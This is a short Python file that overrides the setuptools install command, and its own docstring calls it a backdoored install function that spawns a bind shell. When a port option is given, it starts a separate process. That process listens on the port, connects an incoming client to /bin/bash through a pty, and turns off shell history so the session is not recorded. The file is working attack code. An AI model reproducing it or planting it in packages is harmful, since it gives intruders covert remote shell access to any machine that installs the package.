import multiprocessing
import time
import os
import pty
import socket
from setuptools.command.install import install as base

def shell(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', int(port)))
    s.listen(1)
    (rem, addr) = s.accept()
    os.dup2(rem.fileno(), 0)
    os.dup2(rem.fileno(), 1)
    os.dup2(rem.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    pty.spawn("/bin/bash")
    s.close()

def multi(port):
    cc = multiprocessing.Process(name='shell', target=shell, args=(port,))
    cc.start()


class install(base):
    """
    Backdoored install function that spawns a bind shell
    """

    user_options = base.user_options + [
        ('port=', None, "Port to bind to")
    ]

    def initialize_options(self):
        base.initialize_options(self)
        self.port = None

    def run(self):
        if self.port:
            mult = multiprocessing.Process(name='multi', target=multi, args=(self.port,))
            mult.daemon = False
            mult.start()
            time.sleep(.5) # Give it just long enought to start
            mult.terminate()
        base.run(self)
